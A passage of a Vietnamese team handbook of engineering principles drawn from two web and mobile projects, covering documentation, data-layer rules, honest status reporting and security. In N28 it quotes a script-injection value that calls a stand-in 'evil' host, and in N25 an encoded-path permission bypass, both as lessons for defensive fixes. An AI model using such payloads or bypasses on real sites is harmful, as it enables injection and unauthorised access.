# Nguyên tắc của đội — rút từ dự án Furama House + IConcierge

> Phiên bản 2.1 · 14/11/2026 · N01–N62 rút từ 518 commit, 21 bản thiết kế (spec), 15 kế hoạch (plan), 14 phép thử
> `scripts/check-*.mjs` và ~320KB tri thức trong `CLAUDE.md` của dự án Furama House (07–10/2026). N63–N75 (mục M, O)
> rút từ IConcierge — PWA concierge resort (React + Express + Postgres) kèm app nhân viên Flutter/Android: kiến trúc
> MCA 2.0, 3 ADR, `architecture_test` R1–R6, phát hành APK (05–11/2026). N76–N80 (mục P — SEO & GEO) rút từ tài
> liệu của các công cụ tìm kiếm và trợ lý AI, CHƯA qua dự án thật (11/2026). N81–N83 (mục Q —
> truy vết yêu cầu) phỏng theo github/spec-kit (MIT), cũng CHƯA qua dự án thật.

Đây **không** phải danh sách "best practice" chép từ sách. Mỗi nguyên tắc có một **bài học gốc**: một lần nó bị
vi phạm ở Furama và cái giá đã trả. Khi một nguyên tắc trông thừa, đọc bài học gốc trước khi bỏ nó.

Mỗi mục có mã `Nxx` để agent, skill và người review trích dẫn ngắn gọn ("vi phạm N14", "đã áp N17").

---

## Mục lục nhanh — đọc phần này trước, rồi chỉ lấy mục cần

File này dài (~74KB). Đừng nạp cả file: đọc mục lục, rồi lấy đúng mục bằng
`awk '/^### N14 /{p=1;print;next} p&&/^(### |## |---)/{exit} p' docs/team/NGUYEN-TAC.md` (đổi `N14`; ở bản
skill thì đường dẫn là `<SKILL>/NGUYEN-TAC.md`). Mục L (làm ngay từ ngày đầu) ở cuối file.

**A. Tri thức & tài liệu**
- N01 `CLAUDE.md` là hiến pháp sống: ghi LUẬT + VÌ SAO + CẠM BẪY
- N02 Ghi ở chỗ người sau sẽ đọc LÚC SẮP PHẠM LẠI
- N03 Tài liệu sai tệ hơn không có tài liệu: sửa ngay trong cùng lượt
- N04 Một tài liệu hướng dẫn cho mọi công cụ
- N05 `CLAUDE.md` là MỤC LỤC + LUẬT, chi tiết tách file
- N06 Viết spec trước khi code cho mọi việc dài hơn một buổi

**B. Một nguồn sự thật**
- N07 Field admin sửa được thì trang công khai phải đọc ĐÚNG field đó
- N08 Luật nghiệp vụ viết MỘT lần trong module THUẦN, mọi nơi hỏi nó
- N09 Không lưu con số dẫn xuất song song với nguồn của nó
- N10 Hai bảng cho cùng một thứ sẽ lệch — và đã lệch
- N11 Danh sách hằng gom một chỗ; chỗ nào type system không bắt được thì ghi đích danh

**C. Luật nghiệp vụ ở tầng dữ liệu**
- N12 Tầng dữ liệu là backend, route mỏng, luật đặt ở CỬA GHI THẬT
- N13 State machine bằng ĐỘNG TỪ; guard trạng thái nằm TRONG chính câu UPDATE
- N14 Tham số chính sách là BẮT BUỘC: cửa mới quên chọn là lỗi biên dịch, không phải lỗ hổng im lặng
- N15 Mọi cửa ghi kiểm HÌNH DẠNG dữ liệu, kể cả giá trị "khớp regex"
- N16 Định danh và quyền lợi LẤY TỪ PHIÊN, không bao giờ từ body
- N17 Chống gửi trùng BA LỚP cho mọi cửa submit
- N18 Giữ tài nguyên giới hạn bằng thao tác NGUYÊN TỬ, và liệt kê MỌI đường nhả

**D. Trung thực — trạng thái, lỗi, dữ liệu**
- N19 Trạng thái ghi đúng SỰ THẬT, kể cả khi sự thật là "chưa thử"
- N20 Side effect chạy SAU khi đã ghi thì KHÔNG BAO GIỜ được ném
- N21 Phân loại lỗi theo NGUỒN, không theo chỗ bắt
- N22 Đọc lỗi ở CHỐT CHẶN thì NÉM; chỉ được nuốt ở chỗ thuần hiển thị
- N23 Không khai man dữ liệu, kể cả dữ liệu chỉ máy đọc
- N24 Cảnh báo cho người vận hành phải nói được NÊN LÀM GÌ

**E. Bảo mật & phân quyền**
- N25 Ma trận quyền một nguồn, mặc định CHẶN, có script kiểm route thiếu luật
- N26 Không rò sự tồn tại
- N27 Trả dữ liệu ra client bằng WHITELIST; cột mới mặc định KHÔNG lọt ra
- N28 Chuỗi cấu hình nội suy vào code chạy được phải qua WHITELIST định dạng
- N29 Mọi cửa đăng nhập có giới hạn thử: hai tầng, chặn TRƯỚC khi băm mật khẩu
- N30 Bí mật cấu hình không bao giờ ra form/API đọc; panel có nút GỬI THỬ trả nguyên lỗi
- N60 Form công khai có lớp chống rác — và lớp đó không được nuốt người thật
- N61 Route tự động gác bằng bí mật; THIẾU bí mật thì TỪ CHỐI, không cho qua

**F. Dữ liệu, triển khai, vận hành**
- N31 Migration chạy TRƯỚC deploy khi code mới ghi/đọc cột mới; thứ tự ghi trong spec
- N32 Dữ liệu trỏ tới file mới chỉ được ghi SAU khi file đã live
- N33 Script dữ liệu an toàn theo mặc định
- N34 Mọi mutation purge cache của thứ nó vừa đổi, bằng purge CỨNG
- N35 Ràng buộc gói miễn phí là ràng buộc THIẾT KẾ; đo trước khi chọn cần gạt
- N36 Đường lùi và nút khẩn cấp được viết ra TRƯỚC khi cần

**G. Kiểm chứng**
- N37 Không có test runner vẫn phải có phép thử
- N38 "Y hệt bản cũ" ≠ "đúng": kiểm theo ĐẶC TÍNH mong muốn
- N39 Một phép kiểm chỉ chứng minh những gì nó biết tìm
- N40 "Xong" = đã kiểm bằng thứ thật; báo cáo tách ĐÃ KIỂM và CHƯA KIỂM
- N41 Phần hạ tầng có MA TRẬN KIỂM, chạy lại sau mỗi lần sửa

**H. Hiệu năng**
- N42 Đo trước, đo sau, bằng số; A/B xen kẽ, lấy median; ghi số vào tri thức
- N43 Chi phí thật thường là SỐ VÒNG MẠNG và SỐ BYTE, không phải số dòng code
- N44 Chuyển động chỉ dùng `transform`/`opacity`; animation vô hạn tự dừng ngoài màn hình
- N45 Byte tải về phải khớp thứ được VẼ RA

**I. Giao diện & trải nghiệm**
- N46 Nội dung cho SEO nằm trong HTML tĩnh; client component chỉ giữ TRẠNG THÁI
- N47 Tiếp cận (a11y) là luật, không phải điểm cộng
- N48 Form không bao giờ làm mất thứ người dùng vừa gõ
- N49 Giá trị dẫn xuất không phải state — và phải dùng nó ở MỌI chỗ
- N50 Hai hệ thị giác: trang khách (thương hiệu) và công cụ nội bộ (dày đặc)
- N51 Chỗ trên màn hình là hữu hạn: đo trước khi thêm cột/phần tử

**J. Đa ngôn ngữ & nội dung**
- N52 Từ điển gốc là SHAPE; lưu bản dịch SPARSE; bản dịch của một chuỗi đã sửa là bản dịch sai
- N53 Ngày giờ là của ĐỊA ĐIỂM, không phải của máy người xem hay máy chủ
- N54 Dịch máy là BẢN NHÁP có guard; sửa PROMPT trước khi vá đầu ra
- N55 Nội dung dài sống trong repo và có lint — nhưng lint có ba điểm mù
- N56 `alt` là nội dung; "upload thành công" ≠ "nội dung của tôi đã lên"
- N62 Bảng thuật ngữ dịch là MỘT nguồn; kiểm bằng cách đếm khối

**K. Làm việc với chủ dự án**
- N57 Quyết định chính sách là của chủ dự án; ghi rõ "đây là lựa chọn chính sách"
- N58 Mỗi tính năng kết thúc bằng "Đánh đổi đã biết" và "Còn nợ"
- N59 Hành động ra bên ngoài phải hỏi trước và có lá chắn

**M. Kiến trúc module — rút từ IConcierge**
- N63 Ranh giới module phải được MÁY kiểm; ranh giới chỉ nằm trong quy ước thì sẽ bị xuyên
- N64 Mỗi module có manifest ghi điều code KHÔNG tự nói được; đọc trước khi sửa, sửa cùng PR
- N65 Contract mọc lên khi có người dùng thật, không dựng sẵn; tách slice khi có người cần, không trước
- N66 Ngoại lệ của luật kiến trúc ghi ĐÍCH DANH trong chính file luật; bất biến vận hành cũng mã hoá thành luật
- N67 Di trú kiến trúc bằng module SÂU (strangler fig), không bằng dời thư mục; nói thật phần chưa đạt
- N68 Từ điển thuật ngữ + ADR: quyết định khó đảo ngược có chỗ ở, để không bị đề xuất lại

**O. App di động — rút từ app nhân viên Flutter của IConcierge**
- N69 App di động là client MỎNG của cùng một API; luật nghiệp vụ ở server
- N70 Realtime: frame SSE là TÍN HIỆU refetch, REST là sự thật, poll chậm là lưới an toàn
- N71 Build xanh ≠ chạy được trên thiết bị; tin thứ đo được trong file build, không tin cờ
- N72 APK phát hành: MỘT khoá ký được sao lưu, đúng ABI, giữ tài nguyên tra-theo-tên
- N73 Cổng phiên bản: public, đứng TRƯỚC tường đăng nhập, fail-open; số phiên bản đọc từ gói, không gõ tay
- N74 Chạy nền là ràng buộc của HỆ ĐIỀU HÀNH, không phải của code — và app phải nói thật giới hạn đó
- N75 App chạy cả ca: pin, mạng, server là yêu cầu chức năng; đăng xuất phải huỷ MỌI timer và stream

**P. SEO & GEO — rút từ tài liệu, CHƯA qua dự án thật**
- N76 URL công khai là tài sản: đổi hay xoá URL phải có redirect vĩnh viễn từ ngày đổi
- N77 Một thực thể, một bộ dữ kiện ở MỌI nơi máy đọc: site, JSON-LD, Google Business, danh bạ
- N78 Cho bot nào đọc là quyết định CHÍNH SÁCH, tách bot huấn luyện khỏi bot tìm kiếm/trích dẫn
- N79 Nội dung để được TRÍCH: trả lời trước, dữ kiện cụ thể, có nguồn và ngày
- N80 GEO và SEO phải ĐO được: bộ câu hỏi cố định, kênh AI trong analytics, Search Console + Bing

**Q. Truy vết yêu cầu — phỏng theo github/spec-kit, CHƯA qua dự án thật**
- N81 Yêu cầu có MÃ; task, phép thử và báo cáo kiểm trỏ về mã — truy vết HAI chiều
- N82 Chỗ chưa rõ ĐÁNH DẤU, không đoán im lặng; mặc định tự chọn thì VIẾT RA để chủ dự án bác được
- N83 Lời "xong" và dấu `[x]` không phải bằng chứng: đối chiếu TỪNG yêu cầu với code và thứ thật

**L. Ở dự án mới, làm KHÁC Furama ngay từ ngày đầu** (bảng ở cuối file)
- L1 `git init` + nhánh tính năng + `.gitignore` chặn `.env*` · L2 tách DB dev / production · L3 test runner
- L4 giới hạn cỡ `CLAUDE.md` · L5 một file hướng dẫn · L6 kiểm hạn mức gói trước khi chọn kiến trúc
- L7 rate limit in-memory ghi rõ là tạm · L8 envelope lỗi + class lỗi từ route đầu · L9 phép kiểm ranh giới module
- L10 app di động: keystore + cổng phiên bản từ bản đầu · L11 trang công khai: Search Console/Bing, bot AI, NAP trước
  ngày ra mắt

---
## Năm thói quen làm nên chất lượng — đọc phần này nếu chỉ có 2 phút

1. **Luật có MỘT chỗ ở, và chỗ đó là cửa ghi thật** — không phải route, không phải form. (N07–N18)
2. **Mọi trạng thái, mọi con số nói đúng sự thật** — kể cả khi sự thật là "chưa biết". (N19–N24)
3. **Không có test runner không phải lý do để không có phép thử** — luật thuần + script Node. (N37–N39)
4. **"Xong" nghĩa là đã kiểm bằng thứ thật** — curl, trình duyệt, đọc lại đặc tính của thứ đang chạy. (N40–N41)
5. **Bài học trả giá bằng sự cố được ghi lại đúng chỗ người sau sẽ đọc lúc sắp phạm lại.** (N01–N06)

---

## A. Tri thức & tài liệu

### N01 — `CLAUDE.md` là hiến pháp sống: ghi LUẬT + VÌ SAO + CẠM BẪY
- **Luật:** mỗi mục ghi (1) luật bất biến, (2) vì sao, (3) cạm bẫy đã sập nếu có, (4) mốc `MM/YYYY`, (5) số đo nếu
  có. Không ghi thứ code hoặc `git log` đã tự nói rõ.
- **Vì sao:** người hoặc agent đến sau đọc một luật không kèm lý do sẽ "dọn" nó đi vì trông thừa.
- **Bài học gốc:** guard đọc `nullableUrl()` được ghi kèm câu "đừng gỡ guard đọc chỉ vì dữ liệu giờ sạch rồi".
  Không có câu đó thì lượt dọn code đầu tiên xoá nó, và chuỗi `"null"` cũ trong DB lại sinh nút dẫn tới trang 404
  trên production — đúng lỗi đã từng xảy ra.

### N02 — Ghi ở chỗ người sau sẽ đọc LÚC SẮP PHẠM LẠI
- **Luật:** bài học về một hàm → comment cạnh hàm + mục chủ đề trong `CLAUDE.md`. Bài học về một quy trình →
  skill/checklist. Không chôn bài học trong commit message.
- **Bài học gốc:** "Thêm bản in PDF cho tầng mới = BA việc, thiếu một là nút không hiện" nằm đúng mục Menu PDF —
  nơi người thêm tầng sẽ mở ra đọc, không phải trong một commit ba tháng trước.

### N03 — Tài liệu sai tệ hơn không có tài liệu: sửa ngay trong cùng lượt
- **Luật:** thấy tài liệu nói ngược code → sửa tài liệu ngay, ghi "(sửa MM/YYYY — câu cũ nói X)".
- **Bài học gốc:** `CLAUDE.md` từng ghi ảnh upload đi qua `/api/admin/content/upload`; thực tế không dòng code nào gọi
  route đó, và một lượt sửa đã nối Cloudinary vào đúng route chết. Ghi chú "mật khẩu demo đã đổi, trả 401" còn sau
  khi DB được seed lại, làm người kiểm tưởng app hỏng. Dòng "thư mục chưa là git repository" vẫn còn sau 518 commit.

### N04 — Một tài liệu hướng dẫn cho mọi công cụ
- **Luật:** `AGENTS.md` và mọi file hướng dẫn cho công cụ AI khác chỉ chứa một dòng trỏ sang `CLAUDE.md`, hoặc là
  symlink. Không bao giờ hai bản nội dung.
- **Bài học gốc:** Furama có `CLAUDE.md` (cập nhật liên tục) và `AGENTS.md` (67KB, chép từ bản cũ, vẫn nói mật khẩu
  demo cũ). Hai bản là hai sự thật — đúng lỗi N10, nhưng ở tầng tài liệu.

### N05 — `CLAUDE.md` là MỤC LỤC + LUẬT, chi tiết tách file
- **Luật:** giữ `CLAUDE.md` dưới ~40KB. Mục tính năng dài quá ~40 dòng thì chuyển sang `docs/tri-thuc/<chu-de>.md`;
  `CLAUDE.md` giữ 3–5 dòng luật bất biến + đường dẫn tới file đó.
- **Vì sao:** `CLAUDE.md` được nạp vào MỌI phiên làm việc. Bản của Furama phình tới 320KB — đắt, và luật quan trọng
  chìm giữa chi tiết tính năng. Đây là điều Furama nên làm khác (xem mục L).

### N06 — Viết spec trước khi code cho mọi việc dài hơn một buổi
- **Luật:** spec (`docs/specs/YYYY-MM-DD-<ten>-design.md`) có: *Yêu cầu* (sự cố khởi nguồn + "thành công khi" là một
  kịch bản đầu-cuối) · *Quyết định* (bảng: quyết định · vì sao · phương án đã loại) · *Dữ liệu/migration + thứ tự
  chạy* · *Thành phần* · *Không làm (YAGNI)* · *Kiểm tra* · *Rollback* · *Cập nhật tri thức*. Plan
  (`docs/plans/…`) có *Ràng buộc chung* + *Trọng điểm review* (những chỗ dễ sai nhất, ghim vào task nào) + task có
  bước kiểm.
- **Bài học gốc:** plan "khoá ngày đặt bàn" ghim trước 5 ca dễ sai (trang tĩnh còn bản cũ, qua nửa đêm, đọc bảng lỗi,
  phạm vi tầng, chồng với ngày khai trương); cả 5 được kiểm trước khi merge, không ca nào lọt ra production.

---

## B. Một nguồn sự thật

### N07 — Field admin sửa được thì trang công khai phải đọc ĐÚNG field đó
- **Luật:** thêm field CMS = chỉ ra được chỗ nó render. Không render được thì đừng thêm field.
- **Bài học gốc:** giờ mở cửa sửa trong CMS chỉ chảy vào JSON-LD, còn viên "pill" khách nhìn thấy là chuỗi tự do
  trong field `meta`. Admin sửa giờ, trang không đổi gì. Phải gỡ chuỗi trùng khỏi seed + migration dọn dữ liệu đã lưu.

### N08 — Luật nghiệp vụ viết MỘT lần trong module THUẦN, mọi nơi hỏi nó
- **Luật:** câu hỏi "hợp lệ không / dùng được không / đang ở trạng thái gì" nằm trong `lib/<chu-de>.ts` không import
  runtime (chỉ `import type`) — form dùng để báo sớm, server dùng làm chốt chặn, admin dùng làm bộ lọc, báo cáo dùng
  để đếm.
- **Bài học gốc:** `lib/offers.ts`, `lib/vouchers.ts` (`voucherState`), `lib/preOpening.ts`, `lib/bookingClosures.ts`.
  Bộ lọc admin "Đang chạy" mà viết lại điều kiện riêng là sớm muộn hiện ra một mã mà form đặt bàn từ chối.

### N09 — Không lưu con số dẫn xuất song song với nguồn của nó
- **Bài học gốc:** credit của khách là SỔ CÁI (số dư = `SUM(amount)`), cố ý không có cột `credit_balance`. Hai biểu
  diễn của một con số chắc chắn có ngày lệch nhau, và lúc đó không ai biết bên nào đúng.

### N10 — Hai bảng cho cùng một thứ sẽ lệch — và đã lệch
- **Bài học gốc:** bảng "chữ ưu đãi đặc biệt" và bảng `offers` khớp nhau bằng chuỗi mã. Khối nổi bật rao "giảm đến
  30%" trong khi mã nó trỏ tới giảm 15% — hai con số in ngay dưới nhau trên cùng một trang. Gộp về một bảng, xoá
  bảng kia.

### N11 — Danh sách hằng gom một chỗ; chỗ nào type system không bắt được thì ghi đích danh
- **Luật:** ngôn ngữ, mã chi nhánh, vai trò… có một nguồn; dùng `Record<Union, …>` để compiler bắt chỗ thiếu. Chỗ
  nào buộc phải `Record<string, …>` (script, prompt, bảng tra) thì liệt kê đích danh trong `CLAUDE.md`: "thêm X thì
  sửa cả N chỗ này, tsc không bắt".
- **Bài học gốc:** tám chỗ tự chép `["en","ko","ja"]`. Thêm tiếng Nga thì hàm làm sạch bản dịch lọc mất RU ngay lúc
  lưu — admin gõ bản dịch, bấm Lưu, không lỗi nào báo, DB trống. Prompt dịch máy thành "Translate into undefined".

---

## C. Luật nghiệp vụ ở tầng dữ liệu

### N12 — Tầng dữ liệu là backend, route mỏng, luật đặt ở CỬA GHI THẬT
- **Luật:** route chỉ: xác thực → gọi hàm tầng dữ liệu → ánh xạ lỗi. Mọi giới hạn, mọi kiểm tra nghiệp vụ nằm trong
  hàm tầng dữ liệu mà MỌI cửa đều đi qua.
- **Bài học gốc:** trần số tiền hoá đơn từng đặt ở một route mà không ai còn gọi; ô nhập thật ở admin vẫn nhận số
  trần trụi. "Đặt luật ở route là đặt nhầm cửa." Luật giờ nằm trong `completeBooking`.

### N13 — State machine bằng ĐỘNG TỪ; guard trạng thái nằm TRONG chính câu UPDATE
- **Luật:** không có hàm "set status" chung. Mỗi chuyển trạng thái là một hàm (`confirm`, `checkIn`, `complete`,
  `cancel`, `markNoShow`…) với điều kiện trạng thái nguồn nằm trong câu UPDATE (`WHERE status IN (…)`), không phải
  đọc → kiểm → ghi. Chính câu UPDATE là khoá chống hai người bấm cùng lúc.
- **Bài học gốc:** `cancelBooking` cũ update theo id vô điều kiện → bấm Huỷ lần hai gửi THÊM một thư huỷ cho khách và
  trừ dư một lượt mã ưu đãi. Thêm `.neq("status","cancelled")` là hết.

### N14 — Tham số chính sách là BẮT BUỘC: cửa mới quên chọn là lỗi biên dịch, không phải lỗ hổng im lặng
- **Luật:** hàm phục vụ nhiều cửa với chính sách khác nhau thì chính sách là tham số KHÔNG có giá trị mặc định
  (union `"enforce" | "override"`; "toàn quyền" phải viết rõ là `null`).
- **Bài học gốc:** `assertBookingWindow(…, closures)`, `checkInBooking(id, requiredReferralCode)`,
  `CheckInAt = "now" | "scheduled"`. Ngược lại: bản vá chống đặt trùng đầu tiên chỉ vá luồng khách; luồng lễ tân vẫn
  đẻ booking trùng thêm gần một tháng vì không có gì buộc nó phải đi qua cùng luật.

### N15 — Mọi cửa ghi kiểm HÌNH DẠNG dữ liệu, kể cả giá trị "khớp regex"
- **Luật:** một hàm `assert<Thu>Shape` cho mọi cửa: ngày giờ phải là ngày giờ CÓ THẬT, số phải trong biên, chuỗi
  liên hệ phải đúng định dạng — kiểm ở server.
- **Bài học gốc:** `2026-02-31` và `T99:99` khớp regex nhưng là Invalid Date; các guard phía sau đều `return false`
  khi không parse được → chuỗi `"25/08/2026 19:00"` lách qua cổng chưa khai trương, còn ô ngày trống đẩy hoa hồng
  vào kỳ chi trả `"T20:00:"` — vĩnh viễn nằm ngoài mọi lô chi trả.

### N16 — Định danh và quyền lợi LẤY TỪ PHIÊN, không bao giờ từ body
- **Luật:** `user_id`, mã giới thiệu, `created_by`, người tiêu credit… đều suy ra từ cookie phiên ở server. Body chỉ
  chở NGUYỆN VỌNG; server kẹp lại theo sự thật (xin dùng 999.999 credit khi còn 10.000 → giữ 10.000, không báo lỗi).
- **Bài học gốc:** mã giới thiệu (sinh hoa hồng 8%) bất biến và không bao giờ nhận từ client — luôn suy từ tài khoản
  lễ tân đang đăng nhập.

### N17 — Chống gửi trùng BA LỚP cho mọi cửa submit
- **Luật:** (1) khoá đồng bộ `submittingRef` ở client — chặn cú bấm thứ hai ngay, không đợi `disabled` render;
  (2) idempotency key sinh một lần mỗi lần gửi (có fallback: `crypto.randomUUID()` NÉM khi site chạy qua HTTP trong
  mạng LAN); (3) server tra key trước, DB có UNIQUE một phần, đụng `23505` thì trả bản ghi của kẻ thắng và KHÔNG
  chạy side effect lần hai.
- **Bài học gốc:** vá luồng khách xong, luồng lễ tân vẫn đẻ trùng vì form không điều hướng đi sau khi xong và nút chỉ
  `disabled` theo state async. Thêm cửa submit mới = đi đủ ba lớp, không ngoại lệ.

### N18 — Giữ tài nguyên giới hạn bằng thao tác NGUYÊN TỬ, và liệt kê MỌI đường nhả
- **Luật:** voucher, lượt mã, credit… giữ bằng UPDATE có điều kiện (compare-and-swap) hoặc RPC có khoá dòng. Viết ra
  danh sách đường nhả (insert lỗi · đua idempotency · huỷ · không đến · hoá đơn nhỏ hơn số đã giữ…). Hàm nhả KHÔNG
  ném lỗi (nó chạy giữa lúc xử lý sự cố) và idempotent.
- **Bài học gốc:** credit có NĂM đường nhả, mã ưu đãi có BA; thiếu một là tiền hoặc lượt của khách bốc hơi. Số dư là
  TỔNG nhiều dòng nên giữ chỗ phải là RPC khoá dòng — CAS trên một cột không đủ.

---

## D. Trung thực — trạng thái, lỗi, dữ liệu

### N19 — Trạng thái ghi đúng SỰ THẬT, kể cả khi sự thật là "chưa thử"
- **Luật:** chỉ ghi "đã gửi / đã trả / đã xong" khi bên thứ ba đã xác nhận. Còn lại là `skipped` + lý do máy đọc,
  `pending`, hoặc `failed` + câu lỗi nguyên văn.
- **Bài học gốc:** hàm gửi thông báo cũ ghi `status: "sent"` cứng cho MỌI thư — kể cả cho 19/28 khách không hề có
  email. Bảng "Thông báo đã gửi" thành nguồn tin sai cho nhân viên. Tương tự, lô chi trả hoa hồng sinh ra ở `pending`
  chứ không `paid`: lệnh chuyển khoản xảy ra ngoài hệ thống, phần mềm không biết tiền đã đi. Hệ quả: "đã gắn lô chi
  trả" ≠ "đã nhận tiền" → báo cáo cho đối tác có BA rổ, không phải hai.

### N20 — Side effect chạy SAU khi đã ghi thì KHÔNG BAO GIỜ được ném
- **Bài học gốc:** hoàn tất booking ghi DB (status + hoa hồng + credit) rồi mới gửi thư. Nếu gửi thư ném lỗi, API trả
  500 trong khi booking đã hoàn tất; admin bấm lại thì nhận "không thể hoàn tất từ trạng thái completed".
- **Luật:** bọc toàn thân hàm side effect trong try/catch, kể cả đoạn ghi log; ghi kết quả thật (N19) và đi tiếp.

### N21 — Phân loại lỗi theo NGUỒN, không theo chỗ bắt
- **Luật:** lỗi nghiệp vụ → 400 + câu cho người dùng · không tồn tại → 404 · chưa đăng nhập → 401 · thiếu quyền → 403
  · ngoài phạm vi dữ liệu → 404 (không xác nhận bản ghi tồn tại) · lỗi hạ tầng (class riêng, vd `DbError`) → 500 +
  câu chung, nguyên văn chỉ vào log. Envelope cố định `{ error: { code, message } }`: `code` cho máy, `message` theo
  ngôn ngữ người dùng. Lỗi có nhiều lý do mang `reason` máy đọc — không so khớp chuỗi; bảng ánh xạ khai
  `as const satisfies` để gõ sai key dịch là lỗi biên dịch.
- **Bài học gốc:** một route catch phẳng mọi lỗi thành 400 → bàn đã bị xoá trả 400 thay vì 404, và lỗi hạ tầng đẩy
  nguyên câu PostgREST tiếng Anh, kèm tên bảng, ra màn hình lễ tân.

### N22 — Đọc lỗi ở CHỐT CHẶN thì NÉM; chỉ được nuốt ở chỗ thuần hiển thị
- **Bài học gốc:** nếu đọc bảng "ngày đã kín bàn" lỗi mà coi là "không ngày nào kín" thì mọi ngày được mở khoá, im
  lặng. Trang công khai nuốt lỗi thành `[]` thì ISR cache một trang "chưa có vị trí tuyển dụng nào" suốt 1 giờ; ném
  thì Next giữ lại bản tốt cũ. Chỉ nuốt (`.catch(() => [])`) ở nơi dữ liệu chỉ để hiển thị, như sitemap.

### N23 — Không khai man dữ liệu, kể cả dữ liệu chỉ máy đọc
- **Luật:** structured data chỉ khai điều có thật — không bịa `price` cho "giảm 15%", không chép số sao Google sang
  `aggregateRating` của mình; trường trống thì KHÔNG khai (khai rỗng tệ hơn không khai). Không lọc khách hài lòng
  mới mời đánh giá (review gating — Google cấm, và nó bóp méo số liệu tự soi).
- **Luật kèm:** chưa có giá thì hiện "???" (`price = -1`), không bịa một con số. "Theo thời giá" (lời hứa với khách)
  và "chưa chốt giá" (nhà hàng chưa quyết) là hai trạng thái khác nhau — đừng gộp.

### N24 — Cảnh báo cho người vận hành phải nói được NÊN LÀM GÌ
- **Bài học gốc:** bài viết hẹn lịch có hai cảnh báo tách bạch: `stale` (đã qua ngày, bài vẫn hiện, nhưng cron không
  dọn — đi sửa cron) và `broken` (ngày không đọc được, bài sẽ không bao giờ hiện — đi sửa ngày). Gộp làm một thì admin
  thấy cảnh báo, mở ra, và không biết mình đang sửa cái gì. Tương tự: kênh + kết quả + lý do gửi tin hiện cạnh nhau
  để nhân viên biết nên gọi điện cho khách hay đi sửa cấu hình email.

---

## E. Bảo mật & phân quyền

### N25 — Ma trận quyền một nguồn, mặc định CHẶN, có script kiểm route thiếu luật
- **Luật:** một file luật quyền (mục · mức · phạm vi); route không có luật ⇒ chỉ tài khoản toàn quyền qua; một script
  quét mọi route và báo route nào chưa có dòng luật. Chốt thật luôn ở API — ẩn nút chỉ là tiện ích.
- **Luật kèm:** khớp đường dẫn trên bản ĐÃ GIẢI MÃ. Bài học gốc: `…/blocks/%67allery` — framework giải mã param nên
  route chạy với `gallery`, trong khi cổng khớp chuỗi thô chỉ đòi quyền thấp hơn.
- **Luật kèm:** phạm vi dữ liệu dùng luật "NẰM TRỌN": bản ghi chạm nhiều chi nhánh chỉ hợp lệ khi MỌI chi nhánh nằm
  trong phạm vi tài khoản.

### N26 — Không rò sự tồn tại
- **Luật:** tra cứu theo (mã + bí mật) trả `null` y hệt nhau khi sai bí mật và khi không có; route "gửi mã đăng nhập"
  luôn trả "đã gửi" với email hợp lệ; bản ghi ngoài phạm vi trả 404 cùng câu với "không tồn tại". Tra cứu theo mã
  công khai thì mã phải sinh bằng CSPRNG và đếm lần hỏi mã không tồn tại vào bộ chống dò.

### N27 — Trả dữ liệu ra client bằng WHITELIST; cột mới mặc định KHÔNG lọt ra
- **Bài học gốc:** route tra cứu bàn của khách trả nguyên `select("*")` — ai có mã + SĐT đọc được ghi chú nội bộ của
  nhà hàng. Giờ đi qua một hàm view với danh sách field cố định; muốn khách thấy cột mới thì thêm vào danh sách có
  chủ đích.

### N28 — Chuỗi cấu hình nội suy vào code chạy được phải qua WHITELIST định dạng
- **Bài học gốc:** mã Google Analytics lấy từ CMS được nội suy vào `<script>` inline trên mọi trang. Chuỗi
  `X'); fetch('//evil…` dán vào form admin sẽ thoát dấu nháy và chạy trên toàn site. Một hàm chuẩn hoá ép
  `^G-[A-Z0-9]{4,24}$`; sai định dạng ⇒ không render script nào. Đừng nới regex, đừng nội suy giá trị thô ở chỗ khác.

### N29 — Mọi cửa đăng nhập có giới hạn thử: hai tầng, chặn TRƯỚC khi băm mật khẩu
- **Luật:** đếm theo (IP, tài khoản) và theo IP, trong một cửa sổ thời gian; chặn trước bcrypt (để dò thoải mái thì
  bcrypt thành đòn bẩy DoS); đăng nhập thành công thì xoá bộ đếm. Chỉ đếm theo IP sẽ khoá cả một khách sạn đi chung
  NAT. Một module, cắm vào MỌI cửa.
- **Bài học gốc:** hai cửa tự chép bộ đếm, hai cửa không có gì — 32 lần sai liên tiếp vẫn trả 401 đều đặn.
- **Luật kèm:** "tài khoản bị khoá" khác "sai mật khẩu", và câu đó chỉ phát ra SAU khi mật khẩu đã đúng.

### N30 — Bí mật cấu hình không bao giờ ra form/API đọc; panel có nút GỬI THỬ trả nguyên lỗi
- **Bài học gốc:** SMTP, khoá Cloudinary, service account AI đều là "secret setting" bị lọc khỏi mọi API đọc. Nút "Gửi
  thử" trả nguyên câu "535 sai mật khẩu" — không có nút đó thì ngày khai trương mới biết là hỏng. Giá trị còn chứa
  `<…>` của file mẫu bị coi là CHƯA điền, nếu không panel báo "Đã cấu hình" khi chưa có khoá nào.

### N60 — Form công khai có lớp chống rác — và lớp đó không được nuốt người thật
- **Luật:** honeypot mang tên VÔ NGHĨA (vd `hp_trap`) + thời gian điền tối thiểu (vài giây) ⇒ trả thành công GIẢ,
  không ghi gì; cộng rate limit theo (định danh, IP) với ngưỡng đủ rộng cho nhiều người chung wifi.
- **Bài học gốc:** honeypot đặt tên `website` hay `company` thì trình duyệt TỰ ĐIỀN hộ người thật ⇒ hồ sơ ứng tuyển thật
  bị bỏ lặng, không ai biết. Ngày tuyển dụng tại quán nhiều người nộp từ cùng một wifi ⇒ ngưỡng theo IP phải rộng.

### N61 — Route tự động gác bằng bí mật; THIẾU bí mật thì TỪ CHỐI, không cho qua
- **Luật:** cron, webhook, endpoint nội bộ kiểm `Authorization: Bearer <secret>`; biến môi trường vắng mặt ⇒ từ chối
  (hỏng về phía an toàn). Cookie phiên: `httpOnly` + `Secure` + `SameSite`; hạn của cookie và hạn của token bên trong
  phải KHỚP nhau.
- **Bài học gốc:** cron đăng bài hẹn lịch bật nội dung công khai nên từ chối khi thiếu `CRON_SECRET` thay vì mở cho mọi
  người gọi. Cookie khách sống 30 ngày nhưng JWT bên trong chỉ 8 giờ ⇒ khách bị đăng xuất ngầm ngay hôm sau.

---

## F. Dữ liệu, triển khai, vận hành

### N31 — Migration chạy TRƯỚC deploy khi code mới ghi/đọc cột mới; thứ tự ghi trong spec
- **Luật:** migration additive; spec ghi "PHẢI chạy trước deploy" và tri thức ghi "ĐÃ CHẠY ngày …, trên DB nào". Hàm
  đọc có thể chịu được thiếu cột; hàm ghi thì không — form gửi cột mới mỗi lần lưu, thiếu cột là cả lần lưu bị từ chối.
- **Bài học gốc:** lặp lại ở nhiều migration (0018, 0019, 0035, 0036, 0043, 0047…) — mỗi lần đều phải ghi rõ thứ tự,
